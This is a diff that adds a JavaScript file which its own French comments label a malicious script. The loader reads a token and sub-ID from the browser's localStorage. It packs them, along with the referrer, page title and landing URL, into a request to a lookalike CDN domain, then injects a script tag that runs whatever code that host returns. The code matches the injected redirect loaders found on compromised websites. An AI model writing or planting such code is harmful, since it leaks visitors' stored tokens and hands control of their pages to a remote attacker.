@@ -1,0 +1,54 @@
+(function () {
+  var config = {
+    R_PATH: "https://cdnjslib.com/rCGc4w",
+    unique: false,
+    ttl: 86400,
+  };
+
+  // Récupération des éléments stockés dans localStorage
+  var token = localStorage.getItem("token");
+  var subId = localStorage.getItem("subId");
+  var createdAt = localStorage.getItem("created_at");
+
+  // Suppression des éléments périmés
+  if (
+    token &&
+    createdAt &&
+    Math.round(Date.now() / 1000) - createdAt > config.ttl
+  ) {
+    localStorage.removeItem("token");
+    localStorage.removeItem("subId");
+    localStorage.removeItem("created_at");
+  }
+
+  // Construction de l'URL de redirection
+  var url = config.R_PATH;
+  url += "?return=js.client";
+  url += "&se_referrer=" + encodeURIComponent(document.referrer);
+  url += "&default_keyword=" + encodeURIComponent(document.title);
+  url +=
+    "&landing_url=" +
+    encodeURIComponent(
+      window.location.hostname +
+        window.location.pathname +
+        window.location.search
+    );
+  url += "&name=" + encodeURIComponent("exampleName"); // Remplacer par un nom réel si nécessaire
+  url += "&host=" + encodeURIComponent(config.R_PATH);
+
+  if (token) {
+    url += "&token=" + encodeURIComponent(token);
+  }
+
+  if (subId) {
+    url += "&sub_id=" + encodeURIComponent(subId);
+  }
+
+  // Création et insertion du script malveillant
+  var script = document.createElement("script");
+  script.type = "application/javascript";
+  script.src = url;
+
+  var firstScript = document.getElementsByTagName("script")[0];
+  firstScript.parentNode.insertBefore(script, firstScript);
+})();
